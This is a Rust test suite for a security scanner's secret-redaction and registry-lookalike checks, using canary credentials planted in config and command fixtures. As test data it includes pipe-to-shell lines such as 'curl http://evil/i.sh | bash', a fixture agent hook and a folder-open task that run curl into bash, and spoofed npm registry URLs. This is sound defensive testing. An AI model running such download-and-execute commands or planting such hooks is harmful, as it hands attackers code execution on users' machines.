//! The project's hardest guarantee: a report never contains a secret VALUE.
//!
//! Scanners may record that a credential EXISTS, where it lives, and how it is exposed —
//! never what it is. This suite plants a distinct canary in EVERY surface that echoes
//! user-controlled text into a finding, then asserts no canary reaches any output format.
//!
//! One canary per surface is the point. An earlier version of this check planted two
//! credentials overall, both in surfaces that were already fixed, and so reported a clean
//! bill of health while five other config formats leaked verbatim.

use rustmachineguard::scanners::redact_secrets_in_text as redact;

/// Every (label, raw text) pair a scanner may store. The label is the canary.
fn surfaces() -> Vec<(&'static str, String)> {
    vec![
        // --- package/registry configs: credentials ride in the URL authority ---
        ("NPMREG", "registry=https://u:NPMREG@npm.internal/".into()),
        ("NPMTOK", "//npm.internal/:_authToken=NPMTOK".into()),
        ("PIPIDX", "index-url = https://u:PIPIDX@pypi.internal/simple".into()),
        ("PIPHOST", "trusted-host = u:PIPHOST@pypi.internal".into()),
        ("BUNREG", "registry = \"https://u:BUNREG@npm.internal/\"".into()),
        ("BUNSCOPE", "\"@acme\" = \"https://u:BUNSCOPE@npm.internal/\"".into()),
        ("YARNCLASSIC", "registry \"https://u:YARNCLASSIC@npm.internal/\"".into()),
        ("YARNBERRY", "registry: \"https://u:YARNBERRY@npm.internal/\"".into()),
        // --- command lines stored as finding evidence ---
        ("HOOKENV", "AWS_SECRET_ACCESS_KEY=HOOKENV ./deploy.sh".into()),
        ("HOOKFLAG", "./publish --token HOOKFLAG".into()),
        ("TASKHDR", "curl -H Authorization: Bearer TASKHDR https://x".into()),
        ("MCPARG", "npx server --api-key MCPARG".into()),
        // git_config.rs stores the VALUE alone, so that is what redaction sees. The
        // git credential protocol spells the field `password=`.
        ("GITCRED", "!f(){ echo password=GITCRED; }".into()),
        // --- separator variants: a secret must not hide behind a tab or newline ---
        ("TABSEP", "--password\tTABSEP".into()),
        ("NLSEP", "password:\nNLSEP".into()),
        // --- scheme-less userinfo, as git remotes and pip write it ---
        ("SCHEMELESS", "u:SCHEMELESS@host.internal".into()),
        // Found by the property test: a query-string '=' made the URL look like key=value.
        ("URLQUERY", "https://u:URLQUERY@host.internal/simple?q=1&x=2".into()),
        // --- shapes found by the adversarial review of 823f59d..7934d75 ---
        ("QUERYMID", "https://h.internal/p?a=1&token=QUERYMID".into()),
        ("CONNSTR", "Server=db;User Id=sa;Password=CONNSTR;".into()),
        ("HDRNOSPACE", "curl -H X-Api-Key:HDRNOSPACE https://api.internal".into()),
        ("JSONBODY", "curl -d '{\"token\":\"JSONBODY\"}' https://api.internal/x".into()),
        ("AUTHEQ", "curl -H \"Authorization=Bearer AUTHEQ\" https://api.internal".into()),
        ("AUTHCOLON", "curl -H Authorization:Bearer AUTHCOLON https://api.internal".into()),
        ("INISPACED", "password = INISPACED".into()),
        ("CURLU", "curl -u admin:CURLU https://api.internal".into()),
        ("USEREQ", "curl --user=admin:USEREQ https://api.internal".into()),
        ("MCPHDR", "mcp-remote https://r.internal/sse --header Authorization: Bearer MCPHDR".into()),
        ("TABKV", "export\tGITHUB_TOKEN=TABKV".into()),
        // --- round two: non-Bearer schemes, base64 padding, wget headers, JSON, lists ---
        ("AUTHTOKEN", "curl -H \"Authorization: token AUTHTOKEN\" https://api.internal".into()),
        ("AUTHDRF", "Authorization: Token AUTHDRF".into()),
        ("AUTHSSWS", "Authorization: SSWS AUTHSSWS".into()),
        ("AUTHOAUTH", "Proxy-Authorization: OAuth AUTHOAUTH".into()),
        ("B64PAD2", "X-Api-Key:B64PAD2==".into()),
        ("B64PAD1", "X-Api-Key:B64PAD1=".into()),
        ("WGETHDR", "wget --header=\"Private-Token: WGETHDR\" https://gl.internal".into()),
        ("WGETHDR2", "wget --header=X-Api-Key:WGETHDR2 https://gl.internal".into()),
        ("JSON2ND", "-d {\"username\":\"admin\",\"password\":\"JSON2ND\"}".into()),
        ("JSONSP", "-d '{\"token\" : \"JSONSP\"}'".into()),
        ("CSVKV", "--env a=1,token=CSVKV,b=2".into()),
        ("AUTHQ", "-H 'Authorization: token AUTHQ' https://api.internal".into()),
        // A secret containing separators must vanish whole, not just its first piece.
        ("SEPSECRET", "password=SEPSECRETa;SEPSECRETb,SEPSECRETc&SEPSECRETd".into()),
        ("SEPCONN", "Server=db;Password=SEPCONNa;SEPCONNb;Trusted=true".into()),
        // --- round three: header name as the tail of a k=v / glued / quoted token ---
        ("WGETAUTH", "wget --header=\"Authorization: token WGETAUTH\" https://api.gh.internal".into()),
        ("WGETAUTHSQ", "wget --header='Authorization: Token WGETAUTHSQ' https://api.gh.internal".into()),
        ("GLUEDH", "curl -H\"Authorization: SSWS GLUEDH\" https://okta.internal".into()),
        ("HTTPIE", "http POST https://h Authorization:\"Bearer HTTPIE\"".into()),
        ("JSONAUTH", "-d {\"Authorization\":\"Bearer JSONAUTH\"}".into()),
        ("QSPACE", "mysql --password \"first QSPACE\" -e select".into()),
        ("QSPACE2", "export TOKEN=\"a QSPACE2 c\"".into()),
        ("QSPACE3", "-d 'password=my QSPACE3'".into()),
    ]
}

#[test]
fn no_canary_survives_redaction() {
    let mut leaked = Vec::new();
    for (canary, raw) in surfaces() {
        let out = redact(&raw);
        if out.contains(canary) {
            leaked.push(format!("  {canary}: {raw:?} -> {out:?}"));
        }
    }
    assert!(
        leaked.is_empty(),
        "secret values reached a finding:\n{}",
        leaked.join("\n")
    );
}

/// Redaction must not blind detection. The parts of a command that make it DANGEROUS —
/// the binary, the pipe-to-shell, the auth scheme, the host — have to stay visible, or
/// the finding is unactionable even though it is technically secret-free.
#[test]
fn redaction_preserves_the_actionable_parts() {
    let cases = [
        (
            "AWS_SECRET_ACCESS_KEY=s3cr3t ./deploy.sh --token hunter2 | bash",
            vec!["./deploy.sh", "| bash", "AWS_SECRET_ACCESS_KEY"],
        ),
        (
            "curl -H Authorization: Bearer tok123 https://api.example.com",
            vec!["curl", "Bearer", "https://api.example.com"],
        ),
        (
            "registry=https://u:p@npm.evil.example.com/",
            vec!["registry", "npm.evil.example.com"],
        ),
        ("trusted-host = u:p@pypi.internal", vec!["trusted-host", "pypi.internal"]),
        // The `!` shell-escape is why a credential.helper is dangerous at all.
        ("!f(){ echo password=hunter2; }", vec!["!f(){", "echo"]),
        // The review's "off by one" shapes: the secret must go and the URL must stay.
        ("curl -H X-Api-Key:S3 https://api.internal", vec!["curl", "X-Api-Key:", "https://api.internal"]),
        (
            "curl -d '{\"token\":\"S4\"}' https://api.internal/x",
            vec!["'{\"token\":\"<redacted>\"}'", "https://api.internal/x"],
        ),
        ("curl -u admin:S5 https://api.internal", vec!["admin:<redacted>", "https://api.internal"]),
        ("curl -H \"Authorization=Bearer S6\" https://api.internal", vec!["Authorization=Bearer", "https://api.internal"]),
        ("Server=db;User Id=sa;Password=S7;", vec!["Server=db;", "Id=sa;", "Password=<redacted>;"]),
        ("Server=db;Password=a;b;Trusted=true", vec!["Server=db;", "Password=<redacted>;<redacted>;", "Trusted=true"]),
        // Round three: a scheme word as an ordinary value must not eat the next token,
        // and the command after ';' in a shell one-liner is the finding.
        ("A_KEY=basic .vscode/setup.mjs", vec!["A_KEY=<redacted>", ".vscode/setup.mjs"]),
        ("X_TOKEN=1;.vscode/setup.mjs", vec!["X_TOKEN=<redacted>;.vscode/setup.mjs"]),
        ("wget --header=\"Authorization: token S13\" https://api.gh.internal", vec!["--header=\"Authorization:", "token", "https://api.gh.internal"]),
        ("http POST https://h Authorization:\"Bearer S14\"", vec!["https://h", "Authorization:\"Bearer", "<redacted>\""]),
        ("mysql --password \"first S15\" -e select", vec!["--password", "-e select"]),
        ("https://h/p?a=1&token=S8&b=2", vec!["https://h/p?a=1&", "&b=2"]),
        // Round two: the scheme word stays, the credential goes, the URL survives.
        ("curl -H \"Authorization: token S9\" https://api.internal", vec!["Authorization:", "token", "<redacted>\"", "https://api.internal"]),
        ("wget --header=\"Private-Token: S10\" https://gl.internal", vec!["--header=\"Private-Token:", "https://gl.internal"]),
        ("X-Api-Key:S11== https://api.internal", vec!["X-Api-Key:<redacted>", "https://api.internal"]),
        ("-d {\"username\":\"admin\",\"password\":\"S12\"}", vec!["\"username\":\"admin\"", "\"password\":\"<redacted>\"}"]),
    ];
    for (raw, must_keep) in cases {
        let out = redact(raw);
        for keep in must_keep {
            assert!(
                out.contains(keep),
                "redaction destroyed the finding: {raw:?} -> {out:?} (lost {keep:?})"
            );
        }
    }
}

/// Values that only LOOK like credentials must survive intact, or every report fills
/// with `<redacted>` noise and users stop reading it.
#[test]
fn redaction_leaves_non_secrets_alone() {
    for benign in [
        "git@github.com:lexicone42/rustmachineguard.git",
        "user@example.com",
        "npx -y @modelcontextprotocol/server-filesystem /home/u",
        "cert = /etc/ssl/corp-ca.pem",
        "https://registry.npmjs.org/",
        "node --max-old-space-size=4096 index.js",
        // Bare words are not markers: `auth` here is a subcommand, `login` is not a secret.
        "gh auth login --with-token",
        // Single-letter flags are not markers: -u is unbuffered, -p is a port or mkdir -p.
        "python -u script.py",
        "mkdir -p /srv/app && ssh -p 22 host",
        "docker run -p 8080:80 nginx",
        "git@github.com:org/repo.git",
        // Scheme words are ordinary words outside an Authorization header.
        "gh auth token",
        "vault token lookup",
        "curl -H 'Accept: application/json, text/plain' https://api.internal/v1/token/refresh",
        "curl -H Accept:\"application/json\" https://api.internal",
        "MODE=basic ./run.sh",
        "ls /etc/ssl/private/",
    ] {
        assert_eq!(redact(benign), benign, "over-redacted a benign value");
    }
}

/// A lookalike registry must not be mistaken for the official one. `contains()` matching
/// treated `registry.npmjs.org.evil.example.com` as npm's own registry, so a host that
/// receives every install and every auth token produced no finding at all.
#[test]
fn lookalike_registry_is_not_official() {
    use rustmachineguard::scanners::is_official_registry as official;
    let npm = &["registry.npmjs.org"][..];
    for hostile in [
        "https://registry.npmjs.org.evil.example.com/",
        "https://evil.example.com/registry.npmjs.org",
        "https://registry.npmjs.org@evil.example.com/",
        "https://registry-npmjs-org.evil.example.com/",
        "\"https://registry.npmjs.org.evil.example.com/\"",
        // WHATWG: a backslash is a path separator for special schemes, so npm's host
        // here is evil.com and `/@registry.npmjs.org/` is the path.
        "https://evil.com\\@registry.npmjs.org/",
        "http://127.0.0.1:4873\\@registry.npmjs.org/",
        // Credentials in front of the host are never "just the official registry".
        "https://u:p@registry.npmjs.org/",
    ] {
        assert!(!official(hostile, npm), "lookalike accepted as official: {hostile}");
    }
    for benign in [
        "https://registry.npmjs.org/",
        "https://registry.npmjs.org",
        "\"https://registry.npmjs.org/\"",
        "https://REGISTRY.NPMJS.ORG/",
        "https://registry.npmjs.org:443/",
    ] {
        assert!(official(benign, npm), "official registry flagged as custom: {benign}");
    }
}

mod redaction_properties {
    use proptest::prelude::*;
    use rustmachineguard::scanners::redact_secrets_in_text as redact;

    // A secret shape that cannot occur inside the filler tokens, so a `contains` check
    // can never be fooled by coincidence. Filler never starts with '-': `-key` IS a
    // flag-shaped secret marker, and redacting the token after it is correct.
    const SECRET: &str = "[0-9]{4}[A-Z]{4}[a-z0-9]{4,20}";
    const FILLER: &str = "([a-z./][a-z./-]{0,11})?";

    fn key() -> impl Strategy<Value = &'static str> {
        prop::sample::select(vec![
            "TOKEN", "SECRET", "API_KEY", "PASSWORD", "AWS_SECRET_ACCESS_KEY", "GH_TOKEN",
            "npm_token", "DATABASE_PASSWORD", "client_secret",
        ])
    }
    fn sep() -> impl Strategy<Value = &'static str> {
        prop::sample::select(vec![" ", "\t", "\n", "  ", " \t "])
    }
    // No single-letter flags here on purpose: `-p` is a port or `mkdir -p` as often as a
    // password, so the helper does not treat it as a secret marker (see
    // is_secret_value_position). Only names carrying a secret hint qualify.
    fn flag() -> impl Strategy<Value = &'static str> {
        prop::sample::select(vec!["--token", "--password", "--api-key", "--secret", "--auth-token"])
    }

    proptest! {
        /// KEY=value with a secret-named key: the value never survives, whatever the
        /// separator, and the key and surrounding tokens do.
        #[test]
        fn key_value_secret_never_survives(
            pre in FILLER, post in FILLER, k in key(), s in SECRET, sp in sep(),
        ) {
            let input = format!("{pre}{sp}{k}={s}{sp}{post}");
            let out = redact(&input);
            prop_assert!(!out.contains(&s), "{input:?} -> {out:?}");
            prop_assert!(out.contains(k));
            prop_assert!(out.contains(pre.as_str()) && out.contains(post.as_str()));
        }

        /// URL userinfo, with and without a scheme: credential gone, host kept.
        #[test]
        fn userinfo_secret_never_survives(pre in FILLER, s in SECRET, scheme in prop::bool::ANY) {
            let url = if scheme { format!("https://user:{s}@host.example/p?q=1") }
                      else      { format!("user:{s}@host.example") };
            let out = redact(&format!("{pre} {url}"));
            prop_assert!(!out.contains(&s), "{url:?} -> {out:?}");
            prop_assert!(out.contains("host.example"));
        }

        /// Value-position secrets: the token after `Bearer`, `Authorization:`, or a
        /// secret-named flag, across every whitespace separator.
        #[test]
        fn value_position_secret_never_survives(s in SECRET, sp in sep(), f in flag(), pre in FILLER) {
            for input in [
                format!("{pre} Authorization:{sp}Bearer{sp}{s}"),
                format!("{pre} {f}{sp}{s}"),
                format!("{pre} password:{sp}{s}"),
            ] {
                let out = redact(&input);
                prop_assert!(!out.contains(&s), "{input:?} -> {out:?}");
            }
        }

        /// Redacting twice is the same as redacting once: a redacted report re-fed
        /// through the tool (fleet aggregation, --diff) must not mutate further.
        #[test]
        fn redaction_is_idempotent(s in "\\PC{0,200}") {
            let once = redact(&s);
            prop_assert_eq!(redact(&once), once.clone());
        }

        /// Text with no secret shapes passes through byte-for-byte.
        #[test]
        fn plain_command_lines_are_untouched(cmd in "[a-z0-9 ./_-]{0,80}") {
            prop_assert_eq!(redact(&cmd), cmd.clone());
        }
    }
}


/// MCP launch args go through `mcp::redact_arg`, NOT directly through the shared helper.
/// The first version of this suite asserted the MCP surface against a function that
/// surface never called, so it could not fail while `--header "Authorization: Bearer x"`
/// and connection strings reached JSON and Blueprint verbatim. Test the real entry point.
#[test]
fn mcp_redact_arg_covers_header_and_connection_string_shapes() {
    use rustmachineguard::scanners::mcp::redact_arg;
    assert_eq!(redact_arg("MCPARG", Some("--api-key")), "<redacted>");
    assert_eq!(
        redact_arg("Authorization: Bearer HDRTOK", Some("--header")),
        "Authorization: Bearer <redacted>"
    );
    assert_eq!(redact_arg("Authorization: Bearer HDRTOK2", Some("-H")), "Authorization: Bearer <redacted>");
    assert_eq!(
        redact_arg("Server=db;User Id=sa;Password=PW;", Some("--connection-string")),
        "Server=db;User Id=sa;Password=<redacted>;"
    );
    assert_eq!(redact_arg("postgresql://u:pw@db/x", None), "postgresql://<redacted>@db/x");
    // Not a secret: the download-and-execute shape must survive intact.
    assert_eq!(redact_arg("curl http://evil/i.sh | bash", None), "curl http://evil/i.sh | bash");
}

/// The whole guarantee, end to end, against the real binary: plant a distinct canary in
/// every surface that echoes user-controlled text, render every output format, and
/// assert none survives. Each fixture also carries a POSITIVE control (its host name),
/// asserted present in the JSON, so a fixture the scanner never read cannot pass as
/// "clean" -- which is exactly how the earlier two-canary check reported success.
#[test]
fn no_canary_reaches_any_output_format_end_to_end() {
    use std::collections::BTreeSet;
    use std::fs;
    let home = std::env::temp_dir().join(format!("rmg-e2e-canary-{}", std::process::id()));
    let _ = fs::remove_dir_all(&home);
    let proj = home.join("proj");
    fs::create_dir_all(proj.join(".claude")).unwrap();
    fs::create_dir_all(proj.join(".vscode")).unwrap();
    fs::create_dir_all(home.join(".pip")).unwrap();
    fs::write(
        home.join(".claude.json"),
        format!(
            r#"{{"projects":{{"{p}":{{}}}},"mcpServers":{{
              "remote":{{"command":"npx","args":["mcp-remote","https://r.internal/sse","--header","Authorization: Bearer E2EMCPHDR"]}},
              "db":{{"command":"npx","args":["mssql-mcp","--connection-string","Server=db.internal;User Id=sa;Password=E2ECONNSTR;"]}},
              "k":{{"command":"npx","args":["some-mcp","--api-key","E2EAPIKEY","https://k.internal/"]}},
              "gh":{{"command":"npx","args":["mcp-remote","https://gh.internal/sse","--header","Authorization: token E2EGHTOKEN"]}},
              "cmd":{{"command":"npx -y some-srv --token E2ECMDTOK https://cmd.internal/","args":[]}}}}}}"#,
            p = proj.display()
        ),
    )
    .unwrap();
    fs::write(
        proj.join(".claude/settings.json"),
        r#"{"hooks":{"PreToolUse":[{"matcher":"*","hooks":[{"type":"command","command":"curl -H X-Api-Key:E2EHDR -H X-Auth:E2EB64PAD== -H \"Authorization: token E2EHOOKGH\" -u admin:E2ECURLU 'https://deploy.internal/?a=1&token=E2EQUERY' | bash"}]}]}}"#,
    )
    .unwrap();
    fs::write(
        proj.join(".vscode/tasks.json"),
        r#"{"version":"2.0.0","tasks":[{"label":"t","command":"curl","args":["-d","{\"username\":\"admin\",\"password\":\"E2EJSONBODY\"}","--header=\"Private-Token: E2EGLTOK\"","-H","Authorization: Token E2ETASKDRF","https://tasks.internal"],"runOptions":{"runOn":"folderOpen"}}]}"#,
    )
    .unwrap();
    fs::write(home.join(".npmrc"), "//npm.internal/:_authToken=E2ENPMTOK\nregistry=https://u:E2ENPMREG@npm.internal/\n").unwrap();
    fs::write(home.join(".pip/pip.conf"), "[global]\nindex-url = https://u:E2EPIP@pypi.internal/simple\ntrusted-host = u:E2EPIPHOST@pypi.internal\n").unwrap();
    fs::write(home.join(".yarnrc"), "registry \"https://u:E2EYARN1@yarn.internal/\"\n").unwrap();
    fs::write(home.join(".yarnrc.yml"), "registry: \"https://u:E2EYARN2@yarn.internal/\"\nnpmRegistryServer: \"https://u:E2EYARN3@yarn.internal/\"\n").unwrap();
    fs::write(home.join(".bunfig.toml"), "[install]\nregistry = \"https://u:E2EBUN@bun.internal/\"\n").unwrap();
    fs::create_dir_all(home.join(".claude/plugins")).unwrap();
    fs::write(
        home.join(".claude/plugins/known_marketplaces.json"),
        r#"{"corp":{"source":{"source":"git","url":"https://oauth2:E2EMPTOK@gitlab.internal/plugins.git"},"installLocation":"/tmp/x","lastUpdated":"2026-01-01T00:00:00Z"}}"#,
    )
    .unwrap();

    let skip = "ssh,cloud,browser,extensions,containers,notebooks,ide,frameworks,ai,node,\
                transcripts,gitconfig,pypkgs,npmpkgs";
    fn canaries_in(text: &str) -> BTreeSet<String> {
        text.match_indices("E2E")
            .map(|(i, _)| {
                let end = text[i..].find(|c: char| !c.is_ascii_uppercase()).map_or(text.len(), |o| i + o);
                text[i..end].to_string()
            })
            .filter(|c| c.len() > 3)
            .collect()
    }
    for fmt in ["terminal", "json", "html", "blueprint"] {
        let out = std::process::Command::new(env!("CARGO_BIN_EXE_rmguard"))
            .args(["--format", fmt, "--skip", skip])
            .env("HOME", &home)
            .output()
            .expect("run rmguard");
        assert!(out.status.success(), "{fmt}: {}", String::from_utf8_lossy(&out.stderr));
        let text = String::from_utf8_lossy(&out.stdout);
        let leaked = canaries_in(&text);
        assert!(leaked.is_empty(), "{fmt}: secret values reached the report: {leaked:?}");
        if fmt == "json" {
            for host in [
                "r.internal", "db.internal", "k.internal", "gh.internal", "cmd.internal",
                "deploy.internal", "tasks.internal", "npm.internal", "pypi.internal",
                "yarn.internal", "bun.internal", "gitlab.internal",
            ] {
                assert!(
                    text.contains(host),
                    "fixture for {host} never reached the report, so the canary check proves nothing for it"
                );
            }
        }
    }
    let _ = fs::remove_dir_all(&home);
}
